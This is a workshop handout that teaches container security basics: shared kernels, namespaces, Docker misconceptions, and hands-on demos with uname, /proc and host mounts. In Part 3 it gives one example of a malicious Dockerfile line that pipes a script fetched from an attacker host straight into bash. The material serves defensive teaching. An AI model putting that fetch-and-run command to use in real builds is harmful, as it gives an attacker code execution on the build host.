# Workshop 1: Container Security Basics

## 🎯 Learning Objectives

By the end of this workshop, you will:
- Understand the fundamental difference between containers and VMs from a security perspective
- Recognize why containers share the host kernel and what that means for security
- Identify common security misconceptions about Docker
- Be able to inspect container isolation boundaries

---

## 📚 Part 1: Containers vs VMs (Security View)

### Different Isolation Models

**Virtual Machines Architecture:**


**Container Architecture:**


### Understanding the Key Differences

**VMs virtualize hardware, containers virtualize the operating system.**

**Virtual Machines:**
- Each VM has its own complete kernel
- Strong isolation - kernel vulnerabilities in one VM don't affect others
- If you compromise VM1, you're isolated within that kernel
- Security boundary: Hypervisor

**Containers:**
- All containers share the same host kernel
- Weaker isolation - kernel vulnerabilities affect ALL containers
- If you escape to the kernel, you control everything
- Security boundary: Kernel namespaces & cgroups

> **Critical Point:** If you find a Linux kernel vulnerability in a container, you can potentially access the host and all other containers on the same host.

---

## 📚 Part 2: Shared Kernel Risk

### One Kernel to Rule Them All

```mermaid
graph LR
    subgraph VMs["🏢 Virtual Machines = Separate Apartments"]
        A1["Apartment 1<br/>Own walls, locks<br/>Own kernel"]
        A2["Apartment 2<br/>Own walls, locks<br/>Own kernel"]
        A3["Apartment 3<br/>Own walls, locks<br/>Own kernel"]
    end
    
    subgraph Containers["🚪 Containers = Rooms in Same Apartment"]
        R1["Room 1<br/>Namespace isolation"]
        R2["Room 2<br/>Namespace isolation"]
        R3["Room 3<br/>Namespace isolation"]
        Door["🔑 Shared Front Door<br/>SINGLE KERNEL"]
        
        R1 --> Door
        R2 --> Door
        R3 --> Door
    end
    
    style Door fill:#ff6b6b,color:#fff
    style A1 fill:#4ecdc4
    style A2 fill:#4ecdc4
    style A3 fill:#4ecdc4
    style R1 fill:#ffe66d
    style R2 fill:#ffe66d
    style R3 fill:#ffe66d
```



> **VMs:** Break into one apartment? Still locked out of others  
> **Containers:** Break through shared kernel? Access to everything

### Real-World Impact

**Kernel Vulnerability Attack Flow**

```mermaid
sequenceDiagram
    participant Attacker
    participant Container1
    participant SharedKernel
    participant Host
    participant Container2
    participant Container3
    
    Attacker->>Container1: 1. Compromise Container 1
    Container1->>SharedKernel: 2. Exploit Kernel Vulnerability<br/>(e.g., CVE-2022-0847 Dirty Pipe)
    SharedKernel->>Host: 3. Gain Root Access on Host
    SharedKernel->>Container2: 4. Access Container 2
    SharedKernel->>Container3: 5. Access Container 3
    
    Note over SharedKernel: ⚠️ Single kernel = Single point of failure
    
    style SharedKernel fill:#ff6b6b,color:#fff
    style Host fill:#ff9999
    style Container1 fill:#ffcc99
    style Container2 fill:#ff9999
    style Container3 fill:#ff9999
```

```bash
# If Linux kernel has CVE-2022-0847 (Dirty Pipe)
# An attacker in ANY container can:
# 1. Exploit the kernel vulnerability
# 2. Gain root on the HOST
# 3. Access ALL containers on that host
```

**Syscall Sharing**
```bash
# Every container syscall goes through the SAME kernel
# No separation at the kernel level
```

**Demonstration: Shared Kernel**
```bash
# Check kernel version on host
uname -r

# Check kernel version in container
docker run ubuntu uname -r
# Same kernel version! 🚨
```

> **"Container isolation is an illusion enforced by the kernel. If the kernel is compromised, all bets are off."**

---

## 📚 Part 3: Containers Are NOT a Security Boundary

### Official Position from Docker and Kubernetes

**Docker's Official Stance:**
> "Containers do not contain"

**Kubernetes Security Documentation:**
> "Container runtimes and the underlying kernel are not fully isolated"

### What Does This Mean?

Containers provide **process isolation**, not **security isolation**.

```mermaid
graph TB
    subgraph Good["✅ What Containers ARE Good For"]
        G1["📦 Packaging Applications"]
        G2["🔧 Dependency Isolation"]
        G3["⚡ Resource Limits<br/>(CPU, Memory)"]
        G4["🚀 Portability"]
    end
    
    subgraph Bad["❌ What Containers ARE NOT Designed For"]
        B1["🚫 Running Untrusted Code"]
        B2["🚫 Multi-tenant Security"]
        B3["🚫 Kernel Exploit Protection"]
        B4["🚫 Replacing Security Boundaries"]
    end
    
    style Good fill:#d4edda
    style Bad fill:#f8d7da
    style G1 fill:#c3e6cb
    style G2 fill:#c3e6cb
    style G3 fill:#c3e6cb
    style G4 fill:#c3e6cb
    style B1 fill:#f5c6cb
    style B2 fill:#f5c6cb
    style B3 fill:#f5c6cb
    style B4 fill:#f5c6cb
```



### Real-World Example:

**Scenario:** You run a containerized CI/CD system where users can submit code.

```bash
# User submits malicious Dockerfile:
FROM ubuntu
RUN curl attacker.com/exploit.sh | bash

# This code runs with kernel access
# Can potentially escape to host
```

**Better Approach:**
- Use VMs for untrusted workloads
- Add additional security layers (seccomp, AppArmor, SELinux)
- Use gVisor, Kata Containers, or Firecracker for stronger isolation

---

## 📚 Part 4: Common Security Myths

### Myth #1: "Docker is secure by default"

**Reality:**
```bash
# Default Docker behavior:
docker run -it ubuntu bash

# Your container runs as root by default 🚨
# Has access to many kernel capabilities
# Can make privileged syscalls
```

**Truth:** Docker prioritizes **convenience over security** by default.

---

### Myth #2: "Containers can't access the host"

**Reality:**
```bash
# Mount host filesystem
docker run -v /:/host ubuntu

# Now inside container:
ls /host
# You can see EVERYTHING on the host! 🚨
```

**Truth:** Containers can access whatever you give them permission to access.

---

### Myth #3: "Using Alpine Linux makes containers secure"

**Reality:**
- Alpine is smaller → smaller attack surface ✅
- But still shares the host kernel ❌
- Still vulnerable to container escape ❌
- Still runs as root by default ❌

**Truth:** Small images help, but don't solve fundamental container security issues.

---

### Myth #4: "Private registry = Secure images"

**Reality:**
```bash
# Private doesn't mean secure
# Could still contain:
- Vulnerable dependencies
- Malware
- Backdoors
- Secrets in layers
```

**Truth:** You need image scanning and verification, regardless of registry location.

---

### Myth #5: "Kubernetes adds security"

**Reality:**
- Kubernetes is an orchestrator, not a security tool
- Adds network policies ✅
- But inherits all container security issues ❌
- Misconfiguration can make things WORSE

**Truth:** Kubernetes gives you security **tools**, but you must configure them properly.

---

## 🎬 Live Demonstrations

### Demo 1: Proving Shared Kernel

```bash
# Check host kernel
echo "=== Host Kernel ==="
uname -r
cat /proc/version

# Run multiple containers
echo -e "\n=== Container 1 (Ubuntu) ==="
docker run --rm ubuntu uname -r

echo -e "\n=== Container 2 (Alpine) ==="
docker run --rm alpine uname -r

echo -e "\n=== Container 3 (CentOS) ==="
docker run --rm centos:7 uname -r

# All show the SAME kernel version!
```

**Key Observation:** Three different Linux distributions, but one kernel. This is why kernel security is critical.

---

### Demo 2: Inspect Container Processes

```bash
# Start a container in background
docker run -d --name demo-container alpine sleep 3600

# From HOST, view container processes
echo "=== Processes from Host View ==="
ps aux | grep sleep
# You can see the container process from the host!

# Check the process namespace
echo -e "\n=== Process Namespaces ==="
docker inspect demo-container | grep Pid
# Note the PID

# View from different perspectives
HOST_PID=$(docker inspect -f '{{.State.Pid}}' demo-container)
echo "Container PID on host: $HOST_PID"

# Inside container
echo -e "\n=== Inside Container ==="
docker exec demo-container ps aux
# Container thinks it's PID 1

# Host perspective
echo -e "\n=== Host Perspective ==="
ps -p $HOST_PID -o pid,ppid,command
```

**Key Observation:** Containers are just processes with namespaces. They're not magic, just clever Linux features.

---

### Demo 3: Inspect Namespaces

```bash
# Get container's PID
CONTAINER_PID=$(docker inspect -f '{{.State.Pid}}' demo-container)

# List all namespaces for this process
echo "=== Container Namespaces ==="
sudo ls -la /proc/$CONTAINER_PID/ns/

# Typical output:
# lrwxrwxrwx 1 root root 0 mnt -> 'mnt:[4026532574]'
# lrwxrwxrwx 1 root root 0 net -> 'net:[4026532577]'
# lrwxrwxrwx 1 root root 0 pid -> 'pid:[4026532575]'
# lrwxrwxrwx 1 root root 0 uts -> 'uts:[4026532573]'
# lrwxrwxrwx 1 root root 0 ipc -> 'ipc:[4026532576]'

# Compare with host namespaces
echo -e "\n=== Host Namespaces ==="
sudo ls -la /proc/1/ns/

# Notice different namespace IDs
```

**Understanding Namespaces:**

```mermaid
graph LR
    Container["Container Process"]
    
    Container --> MNT["🗂️ mnt<br/>Filesystem<br/>Isolation"]
    Container --> NET["🌐 net<br/>Network<br/>Stack"]
    Container --> PID["🔢 pid<br/>Process<br/>Tree"]
    Container --> UTS["🖥️ uts<br/>Hostname<br/>Isolation"]
    Container --> IPC["💬 ipc<br/>Shared<br/>Memory"]
    Container --> USER["👤 user<br/>UID<br/>Mapping"]
    
    style Container fill:#4ecdc4
    style MNT fill:#95e1d3
    style NET fill:#95e1d3
    style PID fill:#95e1d3
    style UTS fill:#95e1d3
    style IPC fill:#95e1d3
    style USER fill:#95e1d3
```



- **mnt** - Mount namespace (filesystem isolation)
- **net** - Network namespace (separate network stack)
- **pid** - Process ID namespace (isolated process tree)
- **uts** - Unix Timesharing namespace (hostname isolation)
- **ipc** - IPC namespace (shared memory isolation)
- **user** - User namespace (UID mapping)

---

### Demo 4: Shared Kernel Access

```bash
# Container can see kernel information
docker run --rm ubuntu cat /proc/cpuinfo
docker run --rm ubuntu cat /proc/meminfo

# Even kernel parameters
docker run --rm ubuntu sysctl -a | head -20

# These are HOST kernel details!
```

**Key Observation:** The container is reading from the same `/proc` filesystem as the host kernel. This is the shared kernel in action.

---

## 🔬 Hands-On Exercises

### Lab Setup

Create a file `lab-setup.sh`:

```bash
#!/bin/bash

echo "Setting up Container Security Lab 1..."

# Pull required images
docker pull ubuntu:latest
docker pull alpine:latest
docker pull nginx:latest

# Create demo containers
docker run -d --name web1 nginx
docker run -d --name web2 nginx
docker run -d --name alpine-demo alpine sleep 3600

echo "Lab setup complete!"
echo ""
echo "Available containers:"
docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Status}}"
```

---

### Exercise 1: Verify Shared Kernel

**Task:** Prove that all containers share the same kernel.

```bash
# 1. Check your host kernel version
uname -r

# 2. Run these three commands and compare:
docker run --rm ubuntu uname -r
docker run --rm alpine uname -r
docker exec web1 uname -r

# 3. Observe the results
```

**What you should see:** All commands show the same kernel version because containers share the host's kernel.

---

### Exercise 2: Inspect Process Tree

**Task:** View container processes from both inside and outside.

```bash
# 1. Get the container's host PID
docker inspect -f '{{.State.Pid}}' web1

# 2. View process from host
ps aux | grep nginx

# 3. View process from inside container
docker exec web1 ps aux

# 4. What's different about the PID?
#    Host: Shows actual system PID (e.g., 15234)
#    Container: Shows virtualized PID (usually PID 1)

# 5. Check parent process
HOST_PID=$(docker inspect -f '{{.State.Pid}}' web1)
ps -p $HOST_PID -o pid,ppid,command

# Question: What's the parent PID? 
# 4. What's the difference between the PIDs?
#    Host: Shows actual system PID (e.g., 15234)
#    Container: Shows virtualized PID (usually PID 1)

# 5. Check parent process
HOST_PID=$(docker inspect -f '{{.State.Pid}}' web1)
ps -p $HOST_PID -o pid,ppid,command

# What's the parent PID? It should be dockerd or containerd
```

---

### Exercise 3: Explore /proc Filesystem

**Task:** Identify what's shared vs isolated.

```bash
# 1. Enter the alpine container
docker exec -it alpine-demo sh

# 2. Inside container, run these commands:
cat /proc/version        # Kernel version (shared)
cat /proc/cpuinfo        # CPU info (shared)
hostname                 # Hostname (isolated)
cat /proc/meminfo        # Memory info (shared but limited)
ip addr                  # Network (isolated)

# 3. Exit container and compare with host:
exit
cat /proc/version
hostname
ip addr
```

**What you should observe:**
- **Shared:** Kernel version, CPU info, kernel parameters
- **Isolated:** Hostname, network interfaces, process tree, mount points

---

### Exercise 4: Understanding Container Boundaries

**Task:** See how container permissions work (safely).

```bash
# 1. Run a container with host filesystem access
docker run -it --rm -v /:/host ubuntu bash

# 2. Inside container:
ls /host
# You can see the ENTIRE host filesystem!

cd /host/root
ls -la
# Access depends on container privileges

# 3. Exit and observe
exit

# This demonstrates: containers are only as secure as you configure them
```

**Reflection:** What could happen if a malicious container had this level of access?

---

## 💭 Key Concepts to Consider

### When to use Containers vs VMs for Security?
- Use VMs for untrusted workloads
- Use containers for trusted, internal applications
- Consider hybrid: VMs running containers

---

### How could an attacker exploit the shared kernel?
- Kernel vulnerability exploitation
- Container escape vulnerabilities
- Resource exhaustion attacks affecting other containers

---

### Essential Security Measures
- Don't run containers as root
- Drop unnecessary capabilities
- Use minimal base images
- Implement resource limits
- Enable security profiles (seccomp, AppArmor)

---

## 📝 Key Takeaways Summary

```mermaid
mindmap
  root((Container<br/>Security<br/>Basics))
    Shared Kernel
      Fundamental limitation
      Single point of failure
      Kernel vuln affects all
    Containers ≠ VMs
      Process isolation
      Not security isolation
      Different threat models
    Not Secure by Default
      Runs as root
      Many capabilities
      Must harden actively
    Defense in Depth
      Layer controls
      Seccomp profiles
      AppArmor/SELinux
      Minimal images
    Security Boundaries
      Not designed for isolation
      Use VMs for untrusted
      Add security layers
```



1. **Containers share the host kernel** - This is the fundamental security limitation
2. **Containers ≠ VMs** - Different isolation models with different security properties
3. **Docker is not secure by default** - You must actively harden containers
4. **Containers are not a security boundary** - Don't rely on them for isolation alone
5. **Defense in depth** - Layer multiple security controls

---

## 🎯 What's Next?

In **Workshop 2**, we'll learn:
- How vulnerable images get created
- How to choose secure base images
- How to scan for vulnerabilities
- Building minimal, secure images

---

## 📚 Additional Resources

- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [NIST Application Container Security Guide](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-190.pdf)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
- [Understanding Container Isolation](https://www.nginx.com/blog/what-are-namespaces-cgroups-how-do-they-work/)

---

## 🐛 Common Issues & Solutions

**Issue:** "Can't see container processes from host"
```bash
# Solution: Make sure you're checking the right PID
docker inspect -f '{{.State.Pid}}' <container_name>
```

**Issue:** "Permission denied when accessing /proc"
```bash
# Solution: Some operations need sudo
sudo ls -la /proc/<pid>/ns/
```

**Issue:** "Container doesn't show up in ps"
```bash
# Solution: Container might have exited
docker ps -a  # Show all containers
```
